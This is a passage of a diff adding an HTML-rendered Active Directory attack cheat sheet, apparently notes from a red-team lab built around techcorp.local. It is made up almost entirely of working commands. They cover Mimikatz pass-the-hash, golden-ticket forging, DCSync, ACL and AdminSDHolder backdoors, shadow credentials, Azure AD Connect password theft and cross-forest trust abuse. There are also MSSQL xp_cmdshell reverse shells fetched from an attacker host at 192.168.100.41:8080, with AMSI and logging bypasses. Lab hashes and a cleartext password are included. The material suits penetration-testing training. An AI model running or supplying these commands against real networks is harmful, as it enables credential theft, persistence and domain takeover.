+Invoke-Mimikatz -Command <span class="hljs-string">'"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:acxs /run"powershell.exe"'</span>
+
+ls \\us-dc\c$
+Enter-PSSession -ComputerName us-dc -Authentication Negotiate
+</code></pre>
+<h4 class="code-line" data-line-start=858 data-line-end=859 ><a id="Custom_SSP_858"></a>Custom SSP</h4>
+<pre><code class="has-line-data" data-line-start="861" data-line-end="867" class="language-powershell"><span class="hljs-comment"># Custom SSP, once injected in the lsass memory would log the username and password in clear text  </span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"misc::memssp"'</span>
+
+<span class="hljs-comment"># Logs are stored to</span>
+C:\Windows\system32\kiwissp.log
+</code></pre>
+<h4 class="code-line" data-line-start=868 data-line-end=869 ><a id="Admin_SDHolder_868"></a>Admin SDHolder</h4>
+<pre><code class="has-line-data" data-line-start="871" data-line-end="883" class="language-powershell"><span class="hljs-comment"># Resides in System Container of domain and maintains permission for Protected Groups</span>
+<span class="hljs-comment"># Uses Security Descriptor Propagator (SDPROP) every hour and compares the ACL of protected groups &amp; its members with ACL defined in AdminSDHolder and any differences are overwritten</span>
+
+<span class="hljs-comment"># Set generic all rights to our specified principal </span>
+Add-DomainObjectAcl -TargetIdentity <span class="hljs-string">'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local'</span> -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose
+
+<span class="hljs-comment"># Other interesting permissions include (ResetPassword, WriteMembers)</span>
+
+<span class="hljs-comment"># Trigger the SDPropagation</span>
+Invoke-SDPropagator -timeoutMinutes <span class="hljs-number">1</span> -showProgress -verbose
+
+</code></pre>
+<h4 class="code-line" data-line-start=884 data-line-end=885 ><a id="ACL_Abuse_Scenarios_884"></a>ACL Abuse Scenarios</h4>
+<pre><code class="has-line-data" data-line-start="887" data-line-end="923" class="language-powershell">
+&gt;&gt; CASE <span class="hljs-number">1</span>: Modify right on Domain Admins group
+
+<span class="hljs-comment"># Step 1. Check if one of the pricipals we control has any rights on Domain Admin group</span>
+Get-DomainObjectAcl -Identity <span class="hljs-string">'Domain Admins'</span> -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">"studentuserSID"</span>}
+
+<span class="hljs-comment"># Stp 2.  Above Privilege can be abused by adding members to Domain Admin Group</span>
+Add-DomainGroupMember -Identity <span class="hljs-string">'Domain Admins'</span> -Members testda -Verbose
+
+&gt;&gt; CASE <span class="hljs-number">2</span>: Exploiting ResetPassword rights on Domain User Account
+
+<span class="hljs-comment"># Step 1. Change Password of user account if there is any resetpassword rights using powerview</span>
+Set-DomainUserPassword -Identity testda -AccountPassword (<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">"Password@123"</span> -AsPlainText -Force) -verbose
+
+&gt;&gt; CASE <span class="hljs-number">3</span>: DCSync rights on user account
+
+<span class="hljs-comment"># CASE 3.1: Check for presence of DCSync Right to any pricipal in domain</span>
+Find-InterestingDomainAcl -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-match</span> <span class="hljs-string">'repl'</span> -and <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">'S-1-5-21-210670787-2521448726-163245708'</span>}  | select ObjectDN,  ObjectAceType, SecurityIdentifier
+
+Get-DomainObjectAcl -SearchBase <span class="hljs-string">"dc=us,dc=techcorp,dc=local"</span> -SearchScope Base -ResolveGUIDs | ?{(<span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-match</span> <span class="hljs-string">'replication-get'</span>) -or (<span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">'GenericAll'</span>)} | <span class="hljs-built_in">ForEach-Object</span> {<span class="hljs-variable">$_</span> | <span class="hljs-built_in">Add-Member</span> NoteProperty <span class="hljs-string">'IdentityName'</span> $(Convert-SidToName <span class="hljs-variable">$_</span>.SecurityIdentifier);<span class="hljs-variable">$_</span>} | ?{<span class="hljs-variable">$_</span>.IdentityName <span class="hljs-operator">-match</span> <span class="hljs-string">"studentuserx"</span>}
+
+<span class="hljs-comment"># Case 3.2: Assign full rights or DCSync on the domain where we have modify right on user account</span>
+Add-DomainObjectAcl -TargetIdentity <span class="hljs-string">"dc=us,dc=techcorp,dc=local"</span> -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose
+
+Add-DomainObjectAcl -TargetIdentity <span class="hljs-string">"dc=us,dc=techcorp,dc=local"</span> -PrincipalIdentity studentuser1 -Right DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose
+
+
+&gt;&gt; CASE <span class="hljs-number">4</span>: <span class="hljs-keyword">If</span> there is Generic Write attribute available on Computer Object, then we can use <span class="hljs-string">'RBCD'</span> attack
+&gt;&gt; CASE <span class="hljs-number">5</span>: <span class="hljs-keyword">If</span> there is WriteProperty on User Account, the we can inject <span class="hljs-string">'Shadow credentials'</span> using whishker
+
+&gt;&gt; CASE <span class="hljs-number">6</span>: Enable kerberosting, ASEPRoasting and Delegation <span class="hljs-keyword">if</span> we have write access to user account
+Set-DomainObject -Identity devuser -Set @{serviceprincipalname =<span class="hljs-string">'dev/svc'</span>
+Set-DomainObject -Identity devuser -Set @{<span class="hljs-string">"msds-allowedtodelegatetoallowedtodelegateto"</span>=<span class="hljs-string">"ldap/us-dc.us.techcorp.local"</span>}
+Set-DomainObject -SamAccountName devuser1 -Xor @{<span class="hljs-string">"useraccountcontrol"</span>=<span class="hljs-string">"16777216"</span>}
+
+</code></pre>
+<h4 class="code-line" data-line-start=924 data-line-end=925 ><a id="ACL__Security_Descriptors_924"></a>ACL - Security Descriptors</h4>
+<pre><code class="has-line-data" data-line-start="927" data-line-end="956" class="language-powershell"><span class="hljs-comment"># Assign remote access to non-admin user by modifying the ACL for remote access services as WMI and PSRemoting on specific host. The Security Descriptor in ACLs is made of below syntax:</span>
+<span class="hljs-comment"># ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</span>
+<span class="hljs-comment"># A;CI;CCDCLCSWRPWPRCWD;;;SID</span>
+
+- RACE Toolkit can be used <span class="hljs-keyword">for</span> abuse ACL and apply a backdoor <span class="hljs-keyword">for</span> non-admin user access
+
+<span class="hljs-comment"># Load RACE toolkit</span>
+. C:\AD\Tools\RACE\master\RACE.ps1
+
+<span class="hljs-comment"># Set backdoor on loal system or specified system (WMI and Powershell)</span>
+Set-RemoteWMI -SamAccountName studentuser1 -Verbose
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName US-DC -Verbose
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Credential Administrator -namespace <span class="hljs-string">'root\cimv2'</span> Verbose
+
+Set-RemotePSRemoting -SamAccountName studentuser1 -Verbose
+Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc Verbose
+
+<span class="hljs-comment"># Remove the permission</span>
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
+Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Remove
+
+<span class="hljs-comment"># Using RACE or DAMP Toolkit to registry based backdoor</span>
+Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser1 -Verbose
+
+<span class="hljs-comment"># Set backdoor to retrive Machine Account Hash, Local Account Hash or Cached Credentials remotely</span>
+Get-RemoteMachineAccountHash -ComputerName us-dc Verbose
+Get-RemoteLocalAccountHash -ComputerName us-dc Verbose
+Get-RemoteCachedCredential -ComputerName us-dc Verbose
+</code></pre>
+<h4 class="code-line" data-line-start=958 data-line-end=959 ><a id="Shadow_Credentials_958"></a>Shadow Credentials</h4>
+<pre><code class="has-line-data" data-line-start="961" data-line-end="1002" class="language-powershell"><span class="hljs-comment"># User and Computer where we have write permission, we can inject shadow credentials (certificate in msDS-KeyCredentialLink attribute that which acts alternate credentials). Used by Windows Hello for Bussiness</span>
+
+&gt;&gt; CASE I: Shadow Credentials Attack <span class="hljs-keyword">for</span> User Account 
+
+<span class="hljs-comment"># Step 1. Identify the User Object having Write/GenricAll permission</span>
+Find-InterestingDomainAcl -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">"StudentUsers"</span>}
+
+<span class="hljs-comment"># Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)</span>
+
+<span class="hljs-comment"># Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor</span>
+Whisker.exe add /target:support41user
+
+<span class="hljs-comment"># Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user</span>
+Get-DomainUser -Identity supportXuser
+
+<span class="hljs-comment"># Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user</span>
+Rubeus.exe asktgt /user:supportXuser /certificate:xyz== /password:<span class="hljs-string">"1337"</span> /domain:us.techcorp.local
+/dc:US DC.us.techcorp.local /getcredentials /show /nowrap /ptt
+
+
+&gt;&gt; CASE II: Shadow Credentials Attack <span class="hljs-keyword">for</span> Machine Account 
+
+<span class="hljs-comment"># Step 1. Identify the Computer Object having Write/GenricAll permission</span>
+Find-InterestingDomainAcl -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">"mgmtadmin"</span>}
+
+<span class="hljs-comment"># Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)</span>
+C:\AD\Tools\SafetyKatz.exe <span class="hljs-string">"sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor</span>
+Whisker.exe add /target:us-helpdesk$
+
+<span class="hljs-comment"># Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user</span>
+Get-DomainComputer -Identity us-helpdesk
+
+<span class="hljs-comment"># Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user</span>
+Rubeus.exe asktgt /user:us-helpdesk$ /certificate:xyz== /password:<span class="hljs-string">"1337"</span> /domain:us.techcorp.local
+/dc:US-DC.us.techcorp.local /getcredentials /show /nowrap /ptt
+
+Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:xyz== /impersonateuser:administrator /ptt /self
+/altservice:cifs/us-helpdesk
+</code></pre>
+<h4 class="code-line" data-line-start=1004 data-line-end=1005 ><a id="Azure_AD_Connect_1004"></a>Azure AD Connect</h4>
+<pre><code class="has-line-data" data-line-start="1007" data-line-end="1029" class="language-powershell">
+<span class="hljs-comment"># Step 1. Identify the AD Connect user account and machine for syncing the hash between On-prem and Azure AD</span>
+Get-DomainUser -Identity MSOL* -Domain techcorp.local | select -ExpandProperty description
+
+<span class="hljs-comment"># Step 2. Get access to the server identified in the description via helpdesk user (admin)</span>
+.\SafetyKatz.exe <span class="hljs-string">"sekurlsa::pth /user:helpdeskadmin /domain:us.techcorp.local /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /run:powershell.exe"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># Load &amp; execute the ADconnect.ps1 script to fetch the plain text password for MSOL_* user</span>
+iwr http://<span class="hljs-number">192.168</span>.<span class="hljs-number">100.41</span>:<span class="hljs-number">8080</span>/adconnect.ps1 -O adconnect.ps1
+. .\adconnect.ps1
+adconnect
+
+Domain: techcorp.local
+Username: MSOL_16fb75d0227d
+Password: <span class="hljs-number">70</span>&amp;n1{p!Mb7K.C)/USO.a{@m*%.+^<span class="hljs-number">230</span>@KAc[+sr}<span class="hljs-keyword">iF</span>&gt;Xv{<span class="hljs-number">1</span>!{=/}}<span class="hljs-number">3</span>B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K<span class="hljs-variable">$wAr</span>;sOlb7IFh}!%J.o0}?zQ8]fp&amp;.<span class="hljs-number">5</span>w+!!IaRSD@qYf
+
+<span class="hljs-comment"># Open the netonly session for above user </span>
+runas /netonly /user:MSOL_16fb75d0227d cmd.exe
+
+<span class="hljs-comment"># Now, perform DCSync attack to fetch the secrets from DC</span>
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
+</code></pre>
+<h2 class="code-line" data-line-start=1031 data-line-end=1032 ><a id="Cross_Domain_Attacks_1031"></a>Cross Domain Attacks</h2>
+<h4 class="code-line" data-line-start=1034 data-line-end=1035 ><a id="IntraForest_Privilege_Escalation_Child_ustechcorplocal__Parent_techcorplocal_1034"></a>Intra-Forest Privilege Escalation (Child [us.techcorp.local] -&gt; Parent [techcorp.local])</h4>
+<h5 class="code-line" data-line-start=1036 data-line-end=1037 ><a id="CASE_1_Using_Trusted_Domain_Object_TDO__SID_Histroy_1036"></a>CASE 1: Using Trusted Domain Object (TDO) + SID Histroy</h5>
+<pre><code class="has-line-data" data-line-start="1039" data-line-end="1058" class="language-powershell"><span class="hljs-comment"># Step 1. fetch the Trust Key (Inward) using one of the following method from child DC</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::trust /patch"'</span> -ComputerName us-dc
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:us\techcorp$"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::lsa /patch"'</span> -ComputerName us-dc
+
+<span class="hljs-comment"># Step 2. Forge Inter-Realm Trust Ticket </span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726 163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:189517f6dde94659c0aacf1674e46765 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'</span> 
+
+C:\AD\Tools\BetterSafetyKatz.exe <span class="hljs-string">"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:9fb9e247a02e6fde1631efa7fedce6a2 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># Step 3. Inject the TGT in memory and Use Rubeus to request TGS for CIFS Service on Parent-DC</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::ptt trust_tkt.kirbi"'</span>
+
+<span class="hljs-comment"># Step 4. Use TGT to fetch TGS for CIFS Servie on Parent DC</span>
+.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
+
+<span class="hljs-comment"># Step 5. Access the service</span>
+ls \\techcorp-dc.techcorp.local\c$
+</code></pre>
+<h5 class="code-line" data-line-start=1059 data-line-end=1060 ><a id="CASE_2_Using_KRBTGT_account_hash_of_Child_Domain__SID_History_1059"></a>CASE 2: Using KRBTGT account hash of Child Domain + SID History</h5>
+<pre><code class="has-line-data" data-line-start="1062" data-line-end="1079" class="language-powershell"><span class="hljs-comment"># Step 1. fetch the ntlm hash of krbtgt account in child domain</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:krbtgt"'</span>
+
+<span class="hljs-comment"># Step 2. Forge the golden ticket with  Trust key </span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'</span>
+
+C:\AD\Tools\BetterSafetyKatz.exe <span class="hljs-string">"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># Step 4. Access the service</span>
+ls \\techcorp-dc.techcorp.local\c$
+Enter-PSSession techcorp-dc.techcorp.local
+
+<span class="hljs-comment"># Alternately, we can use DC group SID (516) for crafting forged ticket and then perform DCSync</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'</span>
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:techcorp\Administrator /domain:techcorp.local"'</span>
+</code></pre>
+<h4 class="code-line" data-line-start=1081 data-line-end=1082 ><a id="InterForest_Attack__Regular_Domain_Based_Attacks_1081"></a>Inter-Forest Attack - Regular Domain Based Attacks</h4>
+<pre><code class="has-line-data" data-line-start="1084" data-line-end="1135" class="language-powershell">
+&gt;&gt; Kerberost Across Forest Trust
+<span class="hljs-comment"># Note: Enumeration of domain is possible in case of Inound Trust </span>
+Get-DomainUser -SPN -Domain eu.local | select name, serviceprincipalname
+
+.\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
+
+C:\AD\Tools\john-<span class="hljs-number">1.9</span>.<span class="hljs-number">0</span>-jumbo-<span class="hljs-number">1</span>-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\<span class="hljs-number">10</span>k-worst-pass.txt C:\AD\Tools\euhashes.txt
+
+
+&gt;&gt; Constrained Delegation Across Forest Trust
+<span class="hljs-comment"># Note: Requires access to the user/machine account having Constrained Delegation enabled</span>
+
+<span class="hljs-comment"># Step 1.Identofy the user and service where constrained delgation is allowed</span>
+Get-DomainUser -TrustedToAuth -Domain eu.local  | select samaccountname,msds-allowedtodelegateto
+
+<span class="hljs-comment"># Step 2. Calculate the NTLM hash from the user password</span>
+.\Rubeus.exe hash /password:Qwerty@<span class="hljs-number">123</span> /domain:eu.local /user:storagesvc
+
+<span class="hljs-comment"># Step 3. Execute S4U attack to fetch the TGS for CIFS service as Admin on EU-DC</span>
+.\Rubeus.exe s4u /user:storagesvc /rc4:<span class="hljs-number">5</span>C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /msdsspn:<span class="hljs-string">"time/EU-DC.eu.local"</span> /altservice:CIFS /domain:eu.local /dc:eu-dc.eu.local /ptt
+
+<span class="hljs-comment"># Step 4. Access the service</span>
+ls \\eu-dc.eu.local\c$
+
+
+&gt;&gt; Unconstrained Delegation
+<span class="hljs-comment">#Note: Only works if Two-way trust is enabled with TGT Delegation enabled (disabled by default). There is no way to know if TGT delegation is allowed across forest without logging onto the target forest DC and leverage netdom command or AD Module. We can directly attempt the PrintSpool attack and see if it works!</span>
+
+<span class="hljs-comment"># Step 1. Enumerate if TGT Delegation is enabled across forest trust (only possible from target Domain DC)</span>
+netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation
+
+<span class="hljs-comment"># Step 2. Login to machine in current domain having Unconstrained Delegation (us-web)</span>
+.\SafetyKatz.exe <span class="hljs-string">"sekurlsa::pth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:powershell.exe"</span> <span class="hljs-string">"exit"</span>
+
+winrs -r:us-web powershell
+
+<span class="hljs-comment"># Step 3. Execute Rubeus to monitor the TGT on us-web</span>
+.\Rubeus.exe monitor /interval:<span class="hljs-number">5</span> /nowrap
+
+<span class="hljs-comment"># Step 4. Trigger PrintSpool attack (form student vm)</span>
+.\MS-RPRN.exe \\euvendor-dc.euvendor.local \\us-web.us.techcorp.local
+
+<span class="hljs-comment"># Step 5. Import the ticket in memory</span>
+.\Rubeus ptt /ticket:xyz==
+
+<span class="hljs-comment"># Step 6. Perform DCSync attack</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:administrator /domain:usvendor.local /dc:usvendor-dc.usvendor.local"'</span>
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
+
+</code></pre>
+<h4 class="code-line" data-line-start=1136 data-line-end=1137 ><a id="InterForest_Attack__SID_History_enabled_eueuvendor__1136"></a>Inter-Forest Attack - SID History enabled (eu-&gt;euvendor) ]</h4>
+<pre><code class="has-line-data" data-line-start="1139" data-line-end="1172" class="language-powershell">
+<span class="hljs-comment"># Retrive domain trust account hash </span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::trust /patch"'</span> -Computer eu-dc.eu.local
+<span class="hljs-number">5</span>cc0d1e3f17b532a70d5826843af74e1
+
+<span class="hljs-comment"># Current domain SID</span>
+Get-DomainSid
+S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3657428294</span>-<span class="hljs-number">2017276338</span>-<span class="hljs-number">1274645009</span>
+
+<span class="hljs-comment"># Target Domain SID</span>
+Get-DomainSid -Domain euvendor.local
+S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">4066061358</span>-<span class="hljs-number">3942393892</span>-<span class="hljs-number">617142613</span>
+
+<span class="hljs-comment"># Group ID which needs to be impersonated as it has RID &gt; 1000</span>
+Get-DomainGroup -Identity Euadmins  -domain euvendor.local
+S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">4066061358</span>-<span class="hljs-number">3942393892</span>-<span class="hljs-number">617142613</span>-<span class="hljs-number">1103</span>
+
+<span class="hljs-comment"># Create Golden Ticket for User having RID&gt; 1000 as any SID &lt;1000 (DA,EA) will be filtered</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /rc4:5cc0d1e3f17b532a70d5826843af74e1 /user:Administrator /service:krbtgt /target:euvendor.local /ticket:C:\eu_trust_tkt.kirbi"'</span> 
+
+<span class="hljs-comment"># Request CIFS TGS ticket for share on DC using TGT genereatd above</span>
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+
+<span class="hljs-comment"># Once we have access as the normal user on target domain, we can enumerate for local admin rights on other server in domain as "euvendor-net.euvendor.local" </span>
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+
+<span class="hljs-comment"># Invoke command using Powershell remoting</span>
+winrs -r:euvendor-net.euvendor.local hostname
+
+Invoke-Command -ScriptBlock {whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential
+
+NOTE: <span class="hljs-keyword">if</span> <span class="hljs-string">'SIDFilteringForestAware'</span> and <span class="hljs-string">'SIDFilteringQuarantined'</span> is set to <span class="hljs-string">'False'</span>, then it wont be possible to use forged inter-realm TGT impersonating RID &gt; <span class="hljs-number">1000</span>.
+</code></pre>
+<h4 class="code-line" data-line-start=1173 data-line-end=1174 ><a id="InterForest_Attack__Abusing_PAM_Trust_1173"></a>Inter-Forest Attack - Abusing PAM Trust</h4>
+<pre><code class="has-line-data" data-line-start="1176" data-line-end="1206" class="language-powershell">
+<span class="hljs-comment"># PAM Trust is enabled between red/bastion forest and Production Forest using Shadow credentials. These credentials are created in Basion domain and mapped with DA/EA group of production forest</span>
+
+<span class="hljs-comment"># Check for Foreign Security Pricipal (Group/User) in Target Forest (bastion) from techcorp.local</span>
+Get-ADTrust -Filter * 
+Get-ADObject -Filter {objectClass <span class="hljs-operator">-eq</span> <span class="hljs-string">"foreignSecurityPrincipal"</span>} -Server bastion.local
+Get-DomainObject -domain bastion.local | ?{<span class="hljs-variable">$_</span>.objectclass <span class="hljs-operator">-match</span> <span class="hljs-string">"foreignSecurityPrincipal"</span>} 
+
+<span class="hljs-comment"># Gain Access to Basion-DC (use ntlm auth)</span>
+ .\SafetyKatz.exe <span class="hljs-string">"sekurlsa::pth /user:administrator /domain:bastion.local /dc:bastion-dc.bastion.local /rc4:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># On basion-dc, enumerate if there is a PAM trust by validating below 2 conditions for given trust</span>
+Get-ADTrust -Filter {(ForestTransitive <span class="hljs-operator">-eq</span> <span class="hljs-variable">$True</span>) -and (SIDFilteringQuarantined <span class="hljs-operator">-eq</span> <span class="hljs-variable">$False</span>)}
+Get-DomainTrust
+
+<span class="hljs-comment"># It can also be verified by presence of shadow pricipal conatiner</span>
+Get-ADObject -SearchBase (<span class="hljs-string">"CN=Shadow Principal Configuration,CN=Services,"</span> + (Get-ADRootDSE).configurationNamingContext) -Filter *  -Properties *| select Name,member,msDS-ShadowPrincipalSid
+
+Get-DomainObject -Searchbase <span class="hljs-string">"CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local"</span>
+
+<span class="hljs-comment"># Find the IP address of production-dc using DNS Query or Ping command</span>
+Get-DNSServerZone -Zonename production.local | fl *
+
+<span class="hljs-comment"># Enable Trusted Host configuration for WinRM from Admin shell</span>
+<span class="hljs-built_in">Set-Item</span> WSMan:\localhost\Client\TrustedHosts *
+
+<span class="hljs-comment"># Connect with remote system</span>
+Enter-PSSession <span class="hljs-number">192.168</span>.<span class="hljs-number">102.1</span> -Authentication NegotiateWithImplicitCredential
+
+</code></pre>
+<h4 class="code-line" data-line-start=1208 data-line-end=1209 ><a id="MSSQL_DB_Attacks_1208"></a>MSSQL DB Attacks</h4>
+<pre><code class="has-line-data" data-line-start="1211" data-line-end="1275" class="language-powershell"><span class="hljs-comment"># Import PowerUpSql</span>
+Import-Module .\PowerupSQL-master\PowerupSQL.psd1
+iex (iwr https://<span class="hljs-number">192.168</span>.<span class="hljs-number">100</span>.X/PowerUpSQL.ps1 -UseBasicParsing)
+
+<span class="hljs-comment"># Scan for MSSQL DB Installation by SPN Search</span>
+Get-SQLInstanceDomain
+Get-SQLInstanceDomain -Instance dcorp-mssql.organicsecurity.local
+
+<span class="hljs-comment"># Check if the current logged-on user has access to SQL Database</span>
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | SQLConnectionTestThreaded
+
+<span class="hljs-comment"># Gather more info about identified db</span>
+Get-SQLInstanceDomain | Get-SQLServerInfo
+
+<span class="hljs-comment"># Scan for MSSQL misconfigurations to escalate to SA  </span>
+Invoke-SQLAudit -Verbose -Instance TARGETSERVER
+
+<span class="hljs-comment"># Execute SQL query  </span>
+Get-SQLQuery -Query <span class="hljs-string">"SELECT system_user"</span> -Instance TARGETSERVER
+
+<span class="hljs-comment"># Check for presence of DB Link</span>
+Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local
+
+<span class="hljs-comment"># Crawl the DB Link to enecute command, choose specific system via QueryTarget parameter</span>
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local 
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query <span class="hljs-string">"exec master..xp_cmdshell 'whoami'"</span>
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query <span class="hljs-string">"exec master..xp_cmdshell 'whoami'"</span> -QueryTarget db-sqlsrv
+
+<span class="hljs-comment"># Take reverse shell from DB</span>
+Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query <span class="hljs-string">'EXEC master..xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring('</span><span class="hljs-string">'http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1'</span><span class="hljs-string">')"'</span> -QueryTarget db-sqlsrv | select instance,links,customquery | ft
+
+<span class="hljs-comment"># Take reverse shell from DB (BypassLogging &amp; AV detection)</span>
+Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query <span class="hljs-string">'EXEC master..xp_cmdshell '</span><span class="hljs-string">'powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"'</span><span class="hljs-string">''</span> -QueryTarget db-sqlsrv | select instance,links,customquery | ft
+
+Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query <span class="hljs-string">'EXEC master..xp_cmdshell '</span><span class="hljs-string">'powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"'</span><span class="hljs-string">''</span> -QueryTarget db-sqlsrv 
+
+<span class="hljs-comment"># Run command (enables XP_CMDSHELL automatically if required)  </span>
+Invoke-SQLOSCmd -Instance TARGETSERVER -Command <span class="hljs-string">"whoami"</span> | select -ExpandProperty CommandResults
+
+<span class="hljs-comment"># Enable rpc and rpcout on DB-SQLSRV (may require to run it twice)</span>
+Invoke-SQLCmd -Query <span class="hljs-string">"exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"</span>
+
